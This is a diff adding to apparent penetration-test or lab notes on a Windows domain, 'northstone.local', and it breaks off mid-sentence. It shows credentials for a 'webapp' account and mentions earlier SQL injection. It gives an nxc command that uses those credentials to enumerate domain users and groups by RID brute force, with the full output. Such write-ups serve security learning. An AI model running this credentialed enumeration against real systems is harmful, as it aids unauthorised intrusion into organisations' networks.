@@ -287,4 +287,59 @@ MSSQL       10.1.209.181    1433   DC               [+] DC\webapp:WebPass123!
 
 I have access as this user
 
-I can user this to get access ot
+I can user this to get access to the mssql instance, however i have already checked the contents of it via SQLi, and also xm_cmdshell is not on and i dont have the permission to turn it on!
+
+## Dumping users with mssql access
+
+```python
+nxc mssql dc.northstone.local -u webapp -p 'WebPass123!' --rid-brute 20000 --local-auth
+MSSQL       10.1.209.181    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (EncryptionReq:False)
+MSSQL       10.1.209.181    1433   DC               [+] DC\webapp:WebPass123! 
+MSSQL       10.1.209.181    1433   DC               498: NORTHSTONE\Enterprise Read-only Domain Controllers
+MSSQL       10.1.209.181    1433   DC               500: NORTHSTONE\Administrator
+MSSQL       10.1.209.181    1433   DC               501: NORTHSTONE\Guest
+MSSQL       10.1.209.181    1433   DC               502: NORTHSTONE\krbtgt
+MSSQL       10.1.209.181    1433   DC               512: NORTHSTONE\Domain Admins
+MSSQL       10.1.209.181    1433   DC               513: NORTHSTONE\Domain Users
+MSSQL       10.1.209.181    1433   DC               514: NORTHSTONE\Domain Guests
+MSSQL       10.1.209.181    1433   DC               515: NORTHSTONE\Domain Computers
+MSSQL       10.1.209.181    1433   DC               516: NORTHSTONE\Domain Controllers
+MSSQL       10.1.209.181    1433   DC               517: NORTHSTONE\Cert Publishers
+MSSQL       10.1.209.181    1433   DC               518: NORTHSTONE\Schema Admins
+MSSQL       10.1.209.181    1433   DC               519: NORTHSTONE\Enterprise Admins
+MSSQL       10.1.209.181    1433   DC               520: NORTHSTONE\Group Policy Creator Owners
+MSSQL       10.1.209.181    1433   DC               521: NORTHSTONE\Read-only Domain Controllers
+MSSQL       10.1.209.181    1433   DC               522: NORTHSTONE\Cloneable Domain Controllers
+MSSQL       10.1.209.181    1433   DC               525: NORTHSTONE\Protected Users
+MSSQL       10.1.209.181    1433   DC               526: NORTHSTONE\Key Admins
+MSSQL       10.1.209.181    1433   DC               527: NORTHSTONE\Enterprise Key Admins
+MSSQL       10.1.209.181    1433   DC               553: NORTHSTONE\RAS and IAS Servers
+MSSQL       10.1.209.181    1433   DC               571: NORTHSTONE\Allowed RODC Password Replication Group
+MSSQL       10.1.209.181    1433   DC               572: NORTHSTONE\Denied RODC Password Replication Group
+MSSQL       10.1.209.181    1433   DC               1000: NORTHSTONE\DC$
+MSSQL       10.1.209.181    1433   DC               1101: NORTHSTONE\DnsAdmins
+MSSQL       10.1.209.181    1433   DC               1102: NORTHSTONE\DnsUpdateProxy
+MSSQL       10.1.209.181    1433   DC               1103: NORTHSTONE\SQLServer2005SQLBrowserUser$DC
+MSSQL       10.1.209.181    1433   DC               1104: NORTHSTONE\svc_backup
+MSSQL       10.1.209.181    1433   DC               1105: NORTHSTONE\c.mcgill
+MSSQL       10.1.209.181    1433   DC               1106: NORTHSTONE\t.dalton
+MSSQL       10.1.209.181    1433   DC               1108: NORTHSTONE\TempWinRMAccess
+MSSQL       10.1.209.181    1433   DC               1109: NORTHSTONE\Certificate Enrollment Users
+MSSQL       10.1.209.181    1433   DC               1110: NORTHSTONE\c.white
+MSSQL       10.1.209.181    1433   DC               1111: NORTHSTONE\Software Maintainers
+MSSQL       10.1.209.181    1433   DC               1112: NORTHSTONE\j.sullivan
+MSSQL       10.1.209.181    1433   DC               1113: NORTHSTONE\m.harris
+MSSQL       10.1.209.181    1433   DC               1114: NORTHSTONE\d.williams
+MSSQL       10.1.209.181    1433   DC               1115: NORTHSTONE\k.bennett
+MSSQL       10.1.209.181    1433   DC               1116: NORTHSTONE\r.parker
+MSSQL       10.1.209.181    1433   DC               1117: NORTHSTONE\IT Support
+MSSQL       10.1.209.181    1433   DC               1118: NORTHSTONE\b.ward
+MSSQL       10.1.209.181    1433   DC               1119: NORTHSTONE\e.walker
+MSSQL       10.1.209.181    1433   DC               1120: NORTHSTONE\l.turner
+MSSQL       10.1.209.181    1433   DC               1121: NORTHSTONE\o.scott
+MSSQL       10.1.209.181    1433   DC               1122: NORTHSTONE\IT Support Level 2
+MSSQL       10.1.209.181    1433   DC               1123: NORTHSTONE\Print Services Operators
+MSSQL       10.1.209.181    1433   DC               1125: NORTHSTONE\Database Backup Operators
+```
+
+So using `--rid`
